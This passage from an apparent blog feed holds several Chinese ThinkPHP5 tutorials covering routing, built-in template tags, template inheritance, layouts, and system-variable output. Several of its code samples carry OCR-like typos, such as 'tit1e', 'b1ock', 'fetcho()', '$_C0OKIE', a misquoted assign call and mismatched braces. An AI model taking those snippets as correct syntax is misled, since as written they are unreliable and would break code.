false,</code></p><p>该方式下面，只需要对需要定义路由规则的访问地址定义路由规则，其他的仍然按照第一种普通模式的<code>PATH_INFO</code>模式访问URL。</p><h3 id="三、强制模式"><a href="#三、强制模式" class="headerlink" title="三、强制模式"></a><font color=green>三、强制模式</font></h3><p>开启路由，并设置必须定义路由才能访问：</p><p><code>url_route_on   =&gt;  true,</code></p><p><code>url_route_must   =&gt;   true,</code></p><p>这种方式下面必须严格给每一个访问地址定义路由规则（包括首页），否则将抛出异常。</p><p>首页的路由规则采用<code>/</code>定义即可，例如下面把网站首页路由输出<code>Hello,world!</code>我们需要在<code>route.php</code>这个文件中配置路由，要使用官方的   <code>use  think\Route</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Route::get(&#39;&#x2F;&#39;,function()&#123;</span><br><span class="line">return &#39;Hello,world!&#39;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="路由定义"><a href="#路由定义" class="headerlink" title="路由定义"></a><font color=red>路由定义</font></h2><h3 id="注册路由规则"><a href="#注册路由规则" class="headerlink" title="注册路由规则"></a><font color=green>注册路由规则</font></h3><p>路由注册可以采用方法动态单个和批量注册，也可以直接定义路由定义文件的方式进行集中注册。</p><h3 id="动态注册"><a href="#动态注册" class="headerlink" title="动态注册"></a><font color=green>动态注册</font></h3><p>路由定义采用<code>\think\Route</code>类的rule方法注册，通常是在应用的路由配置文件</p><p><code>application/route.php</code>进行注册，格式是：</p><p><code>Route::rule(&#39;路由表达式&#39;，&#39;路由地址&#39;，&#39;请求类型&#39;，&#39;路由参数（数组）&#39;，&#39;变量规则（数组）&#39;)；</code></p><p>例如注册如下路由规则：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use think\Route;</span><br><span class="line">&#x2F;&#x2F; 注册路由到index模块的Index控制器的list操作</span><br><span class="line">Route::rule(&#39;new&#x2F;:id&#39;,&#39;index&#x2F;Index&#x2F;list&#39;);</span><br></pre></td></tr></table></figure><p>我们访问：</p><p><code>http://serverName/new/5</code></p><p>会自动路由到：</p><p><code>http://serverName/index/index/list/id/5</code></p><p>并且原来的访问地址会自动失效。ThinkPHP5.0的路由规则定义是从根目录开始，而不是基于模块名的。</p><p>注意，路由命名标识必须唯一，定义后可以用于URL的快速生成。</p><p>可以在rule方法中指定请求类型，不指定的话默认为任何请求类型，例如：</p><p><code>Route::rule(&#39;new/:id&#39;,&#39;News/update&#39;,&#39;POST&#39;);</code>    表示定义的路由规则在POST请求下才有效。注意：请求类型参数必须大写。</p><table><thead><tr><th>请求类型包括：</th><th>类型</th></tr></thead><tbody><tr><td>GET</td><td>GET请求</td></tr><tr><td>POST</td><td>POST请求</td></tr><tr><td>PUT</td><td>PUT请求</td></tr><tr><td>DELETE</td><td>DELETE请求</td></tr><tr><td>*</td><td>任何请求类型</td></tr></tbody></table><p>系统提供了为不同的请求类型定义路由规则的简化方法，例如：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Route::get(&#39;new&#x2F;:id&#39;,&#39;News&#x2F;read&#39;); &#x2F;&#x2F; 定义GET请求路由规则</span><br><span class="line">Route::post(&#39;new&#x2F;:id&#39;,&#39;News&#x2F;update&#39;); &#x2F;&#x2F; 定义POST请求路由规则</span><br><span class="line">Route::put(&#39;new&#x2F;:id&#39;,&#39;News&#x2F;update&#39;); &#x2F;&#x2F; 定义PUT请求路由规则</span><br><span class="line">Route::delete(&#39;new&#x2F;:id&#39;,&#39;News&#x2F;delete&#39;); &#x2F;&#x2F; 定义DELETE请求路由规则</span><br><span class="line">Route::any(&#39;new&#x2F;:id&#39;,&#39;News&#x2F;read&#39;); &#x2F;&#x2F; 所有请求都支持的路由规则</span><br></pre></td></tr></table></figure><p>如果要定义get和post请求支持的路由规则，也可以用：</p><p><code>Route::rule(&#39;new/:id&#39;,&#39;News/read&#39;,&#39;GET|POST&#39;);</code></p><p>我们也可以批量注册路由规则，例如：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Route::rule([&#39;new&#x2F;:id&#39;&#x3D;&gt;&#39;News&#x2F;read&#39;,&#39;blog&#x2F;:name&#39;&#x3D;&gt;&#39;Blog&#x2F;detail&#39;]);</span><br><span class="line">Route::get([&#39;new&#x2F;:id&#39;&#x3D;&gt;&#39;News&#x2F;read&#39;,&#39;blog&#x2F;:name&#39;&#x3D;&gt;&#39;Blog&#x2F;detail&#39;]);</span><br><span class="line">Route::post([&#39;new&#x2F;:id&#39;&#x3D;&gt;&#39;News&#x2F;update&#39;,&#39;blog&#x2F;:name&#39;&#x3D;&gt;&#39;Blog&#x2F;detail&#39;]);</span><br></pre></td></tr></table></figure><p>注册多个路由规则后，系统会依次遍历注册过的满足请求类型的路由规则，一旦匹配到正确的路由规则后则开始调用控制器的操作方法，后续规则就不再检测。</p><h2 id="定义路由配置文件"><a href="#定义路由配置文件" class="headerlink" title="定义路由配置文件"></a><font color=green>定义路由配置文件</font></h2><p>除了支持动态注册，也可以直接在应用目录下面的route.php的最后通过返回数组的方式直接定义路由规则，内容示例如下:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">return [</span><br><span class="line">    &#39;new&#x2F;:id&#39; &#x3D;&gt; &#39;News&#x2F;read&#39;,</span><br><span class="line">    &#39;blog&#x2F;:id&#39; &#x3D;&gt; [&#39;Blog&#x2F;update&#39;,[&#39;method&#39; &#x3D;&gt; &#39;post|put&#39;], [&#39;id&#39; &#x3D;&gt; &#39;\d+&#39;]],</span><br><span class="line">];</span><br></pre></td></tr></table></figure><p>路由动态注册和配置定义的方式可以并存。由于检测机制问题，动态注册的性能比路由配置要高一些，尤其是多种请求类型混合定义的时候。</p><p>默认情况下，只会加载一个路由配置文件<code>route.php</code>，如果需要定义多个路由文件，可以修改<code>route_config_file</code>的配置参数，例如：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">定义路由配置文件（数组）</span><br><span class="line">&#39;route_config_file&#39; &#x3D;&gt; [&#39;route&#39;, &#39;route1&#39;, &#39;route2&#39;],</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> thinkphp5 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> thinkphp5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>16.thinkphp5模板之内置标签</title>
      <link href="/undefined/16.thinkphp5%E6%A8%A1%E6%9D%BF%E4%B9%8B%E5%86%85%E7%BD%AE%E6%A0%87%E7%AD%BE/"/>
      <url>/undefined/16.thinkphp5%E6%A8%A1%E6%9D%BF%E4%B9%8B%E5%86%85%E7%BD%AE%E6%A0%87%E7%AD%BE/</url>
      
        <content type="html"><![CDATA[<h1 id="一丶模板之内置标签"><a href="#一丶模板之内置标签" class="headerlink" title="一丶模板之内置标签"></a><font color=red>一丶模板之内置标签</font></h1><h2 id="1丶内置标签"><a href="#1丶内置标签" class="headerlink" title="1丶内置标签"></a><font color=green>1丶内置标签</font></h2><p>变量输岀使用普通标签就足够了，但是要完成其他的控制、循环和判断功能，就需要借助模板引擎的标签库功能了，系统内置标签库的所有标签无需引入即可直接使用。   </p><p>内置标签包括：<br>|标签名|作用|<br>|——|————————-|<br>|include|包含外部模板文件|<br>|load|导入资源文件(闭合包括js css import别名)|<br>|volist|循环数组数据输出|<br>|foreach|数组或对象遍历输出|<br>|for|For循环数据输出|<br>|switch|分支判断输出|<br>|case|分支判断输出(必须个switch配套使用)|<br>|default|默认情况输出(闭合 必须和switch配套使用)|<br>|compare|比较输出(包括eq neq it gt egt elt heq nheq等别名)|<br>|range|判断范围输出(包括 in notin between notbetween别名)|<br>|present|判断是否赋值|<br>|notpresent|判断是否尚未赋值|<br>|empty|判断数据是否为空|<br>|notempty|判断数据是否不为空|<br>|defined|判断常量是否定义|<br>|notdefined|判断常量是否未定义|<br>|define|常量定义|<br>|assign|变量赋值(闭合)|<br>|if|条件判断输出|<br>|elseif|条件判断输出(闭合 必须和if标签配套使用)|<br>|else|条件不成立输出(闭合 可用于其他标签)|<br>|php|使用php代码volist|</p><h2 id="2丶循环输出标签"><a href="#2丶循环输出标签" class="headerlink" title="2丶循环输出标签"></a><font color=green>2丶循环输出标签</font></h2><h2 id="VOLIST标签"><a href="#VOLIST标签" class="headerlink" title="VOLIST标签"></a><font color=green>VOLIST标签</font></h2><p>volist标签通常用于查询数据集（ select方法）的结果输出，通常模型的select方法返回的结果是一个二维数组，可以直接使用 alist标签进行输出。在控制器中首先对模板赋值：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$list &#x3D; User::all();</span><br><span class="line">$list-&gt;assign(&#39;list,$list);</span><br></pre></td></tr></table></figure><p>在模板定义如下，循环输出姓名的编号和姓名：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;volist name&#x3D;&quot;list&quot; id&#x3D;&quot;vo&quot;&#125;</span><br><span class="line">&#123;$vo.id&#125;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;&#123;$vo.name&#125;&lt;br&#x2F;&gt;</span><br><span class="line">&#123;&#x2F;volist&#125;</span><br></pre></td></tr></table></figure><p>Volist标签的name属性表示模板赋值的变量名称，因此不可随意在糢板文件中改变。id表示当前的循环变量，可以随意指定，但确保不要和nme属性冲突支持输出查询结果中的部分数据，例如输出其中的第5条~15条记录。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;volist name&#x3D;&quot;list&quot; id&#x3D;&quot;vo&quot; offset&#x3D;&quot;5&quot; length&#x3D;&quot;10&quot;&#125;</span><br><span class="line">&#123;$vo.name&#125;</span><br><span class="line">&#123;&#x2F;volist&#125;</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="https://i.imgur.com/MttrKTC.png" alt="1"><br><img src= "/img/loading.gif" data-src="https://i.imgur.com/JTnMxoM.png" alt="1"><br><img src= "/img/loading.gif" data-src="https://i.imgur.com/8sJTDDv.png" alt="1"><br><img src= "/img/loading.gif" data-src="https://i.imgur.com/o6Q9aiB.png" alt="1"></p><h2 id="FOREACH标签"><a href="#FOREACH标签" class="headerlink" title="FOREACH标签"></a><font color=green>FOREACH标签</font></h2><p>foreach标签类似与volist标签，只是更加简单，没有太多额外的属性，最简单的用法是：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;foreach $list as $vo&#125;</span><br><span class="line">&#123;$vo.id&#125;:&#123;$vo.name&#125;</span><br><span class="line">&#123;&#x2F;foreach&#125;</span><br></pre></td></tr></table></figure><h2 id="FOR标签"><a href="#FOR标签" class="headerlink" title="FOR标签"></a>FOR标签</h2><p>用法：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;for start&#x3D;&quot;开始值&quot;  end&#x3D;&quot;结束值&quot; comparison&#x3D;&quot;&quot; step&#x3D;&quot;步进值&quot;  name&#x3D;&quot;循环变量名&quot; &#125;</span><br><span class="line">&#123;&#x2F;for&#125;</span><br></pre></td></tr></table></figure><p>开始值、结束值、步进值和循环变量都可以支持变量，开始值和结束值是必须的，其他是可选的。comparison的默认值lt,  name的默认值是i ， 步进值的默认值是1，举例如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;for start&#x3D;&quot;1&quot;  end&#x3D;&quot;100&quot;&#125;</span><br><span class="line">&#123;$i&#125;</span><br><span class="line">&#123;&#x2F;for&#125;</span><br></pre></td></tr></table></figure><p>解析后的代码是：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for ($i&#x3D;1; $i&lt;100; $i+&#x3D;1) &#123;</span><br><span class="line">  echo $i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="标签嵌套"><a href="#标签嵌套" class="headerlink" title="标签嵌套"></a>标签嵌套</h2><p>模板引擎支持标签的多层嵌套功能，可以对标签库的标签指定嵌套。</p><p>系统内置的标签中，volist、 switch、if、 elseif、else、foreach、compare（包含所有的比较标签）、（not）present、 （not）empty、 （not）defined等标签都可以嵌套使用。例如：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;volist name&#x3D;&quot;list&quot; id&#x3D;&quot;vo&quot;&#125;</span><br><span class="line">    &#123;volist name&#x3D;&quot;vo[&#39;sub&#39;]&quot; id&#x3D;&quot;sub&quot;&#125;</span><br><span class="line">    &#123;$sub.name&#125;</span><br><span class="line">    &#123;&#x2F;volist&#125;</span><br><span class="line">&#123;&#x2F;volist&#125;</span><br></pre></td></tr></table></figure><p>上面的标签可以用于输出双重循环。</p><h2 id="原生PHP"><a href="#原生PHP" class="headerlink" title="原生PHP"></a>原生PHP</h2><p>Php代码可以和标签在模板文件中混合使用，可以在模板文件里面书写任意的PHP语句代码，包括下面两种方式：</p><h3 id="使用php标签"><a href="#使用php标签" class="headerlink" title="使用php标签"></a>使用php标签</h3><p>例如：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;php&#125;echo &#39;Hello  world!&#39;;&#123;&#x2F;php&#125;</span><br></pre></td></tr></table></figure><p>我们建议需要使用PHP代码的时候尽量采用php标签，因为原生的PHP语法可能会被配置禁用而导致解析错误。</p><h3 id="使用原生php代码"><a href="#使用原生php代码" class="headerlink" title="使用原生php代码"></a>使用原生php代码</h3><p><code>&lt;?php echo &#39;Hello world!&#39;; ?&gt;</code></p><p>注意：php标签或者php代码里面就不能再使用标签（包括普通标签和XML标签了），因此下面的几种方式都是无效的。</p><p>Php标签里面使用了eq标签，因此无效</p><p><code>{php}{eq name=&#39;name&#39;   value=&#39;value&#39;}value{/eq}{/php}</code></p><p>Php标签里面使用了<code>{$user}</code>普通标签输出变量，因此无效。</p><p><code>{php}if($user.name != &#39;ThinkPHP&#39; ) echo  &#39;ThinkPHP&#39; ;{/php}</code></p><p>简而言之，在PHP标签里面不能在使用PHP本身不支持的代码。</p>]]></content>
      
      
      <categories>
          
          <category> thinkphp5 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> thinkphp5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>15.thinkphp5模板之模板继承和包含文件</title>
      <link href="/undefined/15.thinkphp5%E6%A8%A1%E6%9D%BF%E4%B9%8B%E6%A8%A1%E6%9D%BF%E7%BB%A7%E6%89%BF%E5%92%8C%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6/"/>
      <url>/undefined/15.thinkphp5%E6%A8%A1%E6%9D%BF%E4%B9%8B%E6%A8%A1%E6%9D%BF%E7%BB%A7%E6%89%BF%E5%92%8C%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="一丶模板之模板继承和包含文件"><a href="#一丶模板之模板继承和包含文件" class="headerlink" title="一丶模板之模板继承和包含文件"></a><font color=red>一丶模板之模板继承和包含文件</font></h1><h2 id="1丶模板继承"><a href="#1丶模板继承" class="headerlink" title="1丶模板继承"></a><font color=green>1丶模板继承</font></h2><p>模板继承是一项更加灵活的模板布局方式，模板继承不同于模板布局，甚至来说，应该是在模板布局的上层。模板继承其实并不难理解，就好比类的继承一样，模板也可以定义一个基础模板（或者是布局），并且其中定义的相关的区块（block），然后继承（extend）该基础模块的子模板中就可以对基础模板中定义的区块进行重载。</p><p>因此，模板继承的优势其实是设计基础模块中的区块（block）和子模块中替换这些区块。   </p><p>每个区块由（b1ock}{/b1ock}标签组成。下面就是基础模板中的一个典型的区块设计。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;block name&#x3D;&quot;title&quot;&#125;&lt;title&gt;网站标题&lt;&#x2F;title&gt;&#123;&#x2F;block&#125;</span><br></pre></td></tr></table></figure><p>block标签必零指定name属性来标识当前区块的名称，这个标识在当前模板中应该是唯一的， block标签中可以包含任何模板内容，包括其他标签和变量。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;block name&#x3D;&quot;title&quot;&#125;&lt;title&gt;&#123;$web_title&#125;&lt;title&gt;&#123;&#x2F;block&#125;</span><br></pre></td></tr></table></figure><p>一个模板中可以定义任意多个名称标识不重复的区块，例如我们在vew视图目录下面定义了一个 base. html基础模板:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">      &lt;meta charset&#x3D;utf-8&quot;&gt;</span><br><span class="line">      &lt; title&gt;模板继承的演示&lt;&#x2F;tit1e</span><br><span class="line">      &lt;&#x2F;head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">    block name&#x3D;&quot;head&quot;&#125;这是头部&#123;&#x2F; block&#125;</span><br><span class="line">    &#123;block name&#x3D;&quot; footer&quot;&#125;这是底部&#123;&#x2F; block&#125;</span><br><span class="line">    &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>然后我们在子模板（其实是当前操作的入口模板）中使用继承：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;extend name&#x3D;&quot;base&quot;&#x2F;&#125;</span><br><span class="line">&#123;block name&#x3D;&quot;head&quot;&#125;这里是子模板里面的区块，用来替换基础模板里面的内容的&#123;&#x2F;block&#125;</span><br><span class="line">&#123;block name&#x3D;&quot; footer&#125;这里是子模板里面的底部内容&lt;&#x2F;block&gt;</span><br></pre></td></tr></table></figure><p>上例中，我们可以看到在子模板中使用了 extend标签来继承base模板。   </p><p>在子模板中，可以对基模板中的区块进行重载定义，如果没有重新定义的话，则表示沿用基础模板中的区块定义，如果定义了一个空的区块，则表示删除基础模板中的该区块内容。   </p><p>{_ block_}这个标签，当区块中有这个标记时，就不只是直接重载这个区块，他表示引用所继承模板对应区块的内容到这个位置，最终这个区块是合并后的内容。   </p><p>在当前子模板中，只能定义区块而不能定义其他的模板内容，否则将会直接忽略，并且只能定义基础模板中已经定义的区块。   </p><p>模板可以多级继承，比如B继承了A而C又继承了B，最终C中的区块会覆盖B和A中的同名区块，但C和B中的区块必须是A中已定义过的。   </p><p>子模板中的区块定义顺序是随意的，模板继承的用法关键在于基础模板如何布局和设计规划了，如果结合原来的布局功能，则会更加灵活。</p><h2 id="2丶包含文件"><a href="#2丶包含文件" class="headerlink" title="2丶包含文件"></a><font color=green>2丶包含文件</font></h2><p>在当前模板文件中包含其他的模板文件使用 include标签，标签语法   </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;include file&#x3D;&#39;模板文件1，模板文件2，......&#39;&#x2F;&#125;</span><br></pre></td></tr></table></figure><p>包含的模板文件中不能再使用模板布局或者模板继承。   </p><p>路径以项目目录/public/路径下为起点   </p><p>可以直接包含一个模板文件名(包含完整路径),例如：  </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;include file&#x3D;&quot;..&#x2F;application&#x2F;index（模块名）&#x2F;view（视图文件夹）&#x2F;index（控制器）&#x2F;lang.html（具体模板）&quot;&#x2F;&#125;</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="https://i.imgur.com/hhMt8F0.png" alt="1"><br><img src= "/img/loading.gif" data-src="https://i.imgur.com/eprHQT5.png" alt="1"><br>包含文件中可以再使用 include标签包含别的文件，但注意不要形成A包含A，或者A包含B而B又包含A这样的死循环。</p>]]></content>
      
      
      <categories>
          
          <category> thinkphp5 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> thinkphp5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>14.thinkphp5模板之模板布局</title>
      <link href="/undefined/14.thinkphp5%E6%A8%A1%E6%9D%BF%E4%B9%8B%E6%A8%A1%E6%9D%BF%E5%B8%83%E5%B1%80/"/>
      <url>/undefined/14.thinkphp5%E6%A8%A1%E6%9D%BF%E4%B9%8B%E6%A8%A1%E6%9D%BF%E5%B8%83%E5%B1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="一丶模板之模板布局"><a href="#一丶模板之模板布局" class="headerlink" title="一丶模板之模板布局"></a><font color=red>一丶模板之模板布局</font></h1><h2 id="1丶全局配置方式"><a href="#1丶全局配置方式" class="headerlink" title="1丶全局配置方式"></a><font color=green>1丶全局配置方式</font></h2><p>这种方式仅需在项目配置文件中添加相关的布局模板配置,就可以简单实现模板布局功能，比较适用于全站使用相同布局的情况,需要配置开启layout_on参数(默认不开启),并且设置布局入口文件名 layout_name(默认为layout).</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;template&#39;&#x3D;&gt;[</span><br><span class="line">    &#39;layout_on&#39;&#x3D;&gt;true,</span><br><span class="line">    &#39;layout_name&#39;&#x3D;&gt;&#39;layout&#39;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>开启 layout_on后，我们的模板渲染流程就有所变化，例如：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">namespace app\index\controller； </span><br><span class="line">use think\ Controller； </span><br><span class="line">Class Index extends Controller&#123;</span><br><span class="line">    public function index()&#123;</span><br><span class="line">        return $this-&gt;fetcho()</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在不开启layout_on布局模板之前，会直接渲染application/ index/view/ index/ index.htm模板文件，开启之后，首先会渲染 application/inex/view/ layout. htm1模板，布局模板的写法和其他模板的写法类似，本身也可以支持所有的模板标签以及包含文件，区别在于有一个特定的输出替换变量（_ <em>CONTENT_</em>}，例如，下面是一个典型的Layout.htm模板的写法</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div style&#x3D;&quot;width：100%； height：100px； background-color:red； &quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">&#123;__CONTENT__&#125;</span><br><span class="line">&lt;div style&#x3D;&quot;width：100%； height：100px； background-color:blue；&quot;&gt;&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure><p>读取layout模板之后，会解析 index/index.html模板文件，并把解析后的内容替换到layout布局模板文件的{CONTENT}特定字符串。   </p><p>当然可以通过设置来改变这个特定的替换字符串，例如：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;template&#39;&#x3D;&gt;[</span><br><span class="line">    &#39;layout_on&#39;&#x3D;&gt;true,</span><br><span class="line">    &#39;layout_name&#39;&#x3D;&gt;&#39;layout&#39;,</span><br><span class="line">    &#39;layout_time&#39;&#x3D;&gt;&#39;&#123;__REPLACE&#125;&#39;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>一个布局模板同时只能有一个特定替换字符串。<br>采用这种布局方式的情况下，一旦 index/ index. htm模板文件或者 layout. htm布局模板文件发生修改，都会导致模板重新编译。<br>如果需要指定其他位置的布局模板，可以使用</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;template&#39;&#x3D;&gt;[</span><br><span class="line">    &#39;layout_on&#39;&#x3D;&gt;true,</span><br><span class="line">    &#39;layout_name&#39;&#x3D;&gt;&#39;lang&#39;,</span><br><span class="line">    &#39;layout_item&#39;&#x3D;&gt;&#39;&#123;__REPLACE&#125;&#39;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>就表示采用 application/ index/view/ lang. htm1作为布局模板。<br>如果某些页而不需要使用布局模板功能，可以在模板文件开头加上{_ _ NOLAYOUT__}字符串。<br>如果上面的 Index/index. htm模板文件里面包含有{_ <em>NOLAYOUT_</em>},则即使开启布局模板,也不会进行布局模板解析.</p><h2 id="2丶模板标签方式"><a href="#2丶模板标签方式" class="headerlink" title="2丶模板标签方式"></a><font color=green>2丶模板标签方式</font></h2><p>这种布局模板不需要在配置文件中设置任何参数，也不需要开启 ayout on，直接在模板文件中指定布局模板即可，相关的布局模板调整也在模板中进行。<br>以前面的输出模板为例，这种方式的入口还是在 index/index. htm模板，但是我们可以修改下 index模板文件的内容，在头部增加下面的布局标签（记得首先关闭前面的layout_ on设置，否则可能出现布局循环）：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;layout name&#x3D;&quot;layout&quot;&#x2F;&#125;</span><br></pre></td></tr></table></figure><p>表示当前模板文件需要使用1 Layout. htm1布局模板文件，而布局模板文件的写法上面第一种方式是一样的。当渲染 index./ index. htm模板文件的时候，如果读取到 layout标签，则会把当前模板的解析内容替换到 layout布局模板的{<em>_CONTENT</em> _}特定字符串。<br>个模板文件只能使用一个布局模板，如果模板文件中没有使用任何1 ayout标签则表示当前模板不使用任何布局如果需要使用其他的布局模板，可以改变 layout的name属性，例如：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;layout name&#x3D;&quot;newlayout&quot; &#x2F;&#125;</span><br></pre></td></tr></table></figure><h2 id="3丶layout控制模板布局"><a href="#3丶layout控制模板布局" class="headerlink" title="3丶layout控制模板布局"></a><font color=green>3丶layout控制模板布局</font></h2><p>使用内置的ayou方法可以更灵活的在程序中控制模板输出的布局功能，尤其适用于局部需要布局或者关闭布局的情况，这种方式也不需要在配置文件中开启 layout_on.<br>三种模板布局方式中，第一种和第三种是在程序中配置实现模板布局，第二种方式则是单纯通过模板标签在模板中使用布局。<br>具体选择什么方式，需要根据项目的实际情况来了。</p>]]></content>
      
      
      <categories>
          
          <category> thinkphp5 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> thinkphp5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>13.thinkphp5模板系统变量输出和函数使用</title>
      <link href="/undefined/13.thinkphp5%E6%A8%A1%E6%9D%BF%E7%B3%BB%E7%BB%9F%E5%8F%98%E9%87%8F%E8%BE%93%E5%87%BA%E5%92%8C%E5%87%BD%E6%95%B0%E4%BD%BF%E7%94%A8/"/>
      <url>/undefined/13.thinkphp5%E6%A8%A1%E6%9D%BF%E7%B3%BB%E7%BB%9F%E5%8F%98%E9%87%8F%E8%BE%93%E5%87%BA%E5%92%8C%E5%87%BD%E6%95%B0%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="一丶模板系统变量输出和函数使用"><a href="#一丶模板系统变量输出和函数使用" class="headerlink" title="一丶模板系统变量输出和函数使用"></a><font color=red>一丶模板系统变量输出和函数使用</font></h1><h2 id="1丶系统变量输出"><a href="#1丶系统变量输出" class="headerlink" title="1丶系统变量输出"></a><font color=green>1丶系统变量输出</font></h2><p>普通的模板变量需要首先赋值之后才能在模板中输出，但是系统变量则不需要，可以直接在模板中输出，系统变量的输出通常以{$Think打头，例如：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;$Think, server, server_name&#125;&#x2F;&#x2F;输出 $_SERVER[&#39;SERVER_NAME&#39;]变量;</span><br><span class="line">&#123;$Think, session. user_id&#125;&#x2F;&#x2F;输出$_SESSION[&#39;user_id]变量;</span><br><span class="line">&#123;$Think,get.pageNumber&#125;&#x2F;&#x2F;输出$_GET[&#39;pageNumber]变量;</span><br><span class="line">&#123;$Think. cookie.name&#125;&#x2F;输出$_C0OKIE[&#39;name&#39;]变量;</span><br></pre></td></tr></table></figure><p>支持输出$_SERVER丶$_ENV丶$_POST丶$_GET丶$_REQUEST丶$_SESSION和$_COOKIE变量。</p><h2 id="2丶常量输出"><a href="#2丶常量输出" class="headerlink" title="2丶常量输出"></a><font color=green>2丶常量输出</font></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;$Think.const.APP_PATH&#125;或者直接使用&#123;$Think.APP_PATH&#125;</span><br></pre></td></tr></table></figure><h2 id="3丶配置输出"><a href="#3丶配置输出" class="headerlink" title="3丶配置输出"></a><font color=green>3丶配置输出</font></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;$Think.config.defaule_moudle&#125;</span><br><span class="line">&#123;$Think.config.default_controller&#125;</span><br></pre></td></tr></table></figure><h2 id="4丶使用函数"><a href="#4丶使用函数" class="headerlink" title="4丶使用函数"></a><font color=green>4丶使用函数</font></h2><p>我们往往需要对模板输出变量使用函数，可以使用：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;$data.name|md5&#125;</span><br></pre></td></tr></table></figure><p>编译后的结果是：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php echo (md5(data[name]));?&gt;</span><br></pre></td></tr></table></figure><p>如果函数有多个参数需要调用，则使用：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;$create_time|date&#x3D;&quot;y-m-d&quot;,###&#125;</span><br></pre></td></tr></table></figure><p>表示date函数传入两个参数，每个参数用逗号分割，这里第一个参数是y-m-d，第二个参数是前面要输出的create time变量，因为该变量是第二个参数，因此需要用###标识变量位置，编译后的结果是：  </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php echo(date(y-m-d,create time));?&gt;</span><br></pre></td></tr></table></figure><p>还可以支持多个函数过滤，多个函数之间用““分割即可，例如:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">($name|md5|strtoupper|substr&#x3D;0,3&#125;</span><br></pre></td></tr></table></figure><p>编译后的结果是：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php echo (substr(strtoupper(md5($name)),0,3));?&gt;</span><br></pre></td></tr></table></figure><p>函数会按照从左到右的顺序依次调用。<br>如果你觉得这样写起来比较麻烦，也可以直接这样写：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;:substr(strtoupper(md5($name)),0,3)&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> thinkphp5 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> thinkphp5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>12.thinkphp5视图之模板赋值和模板渲染</title>
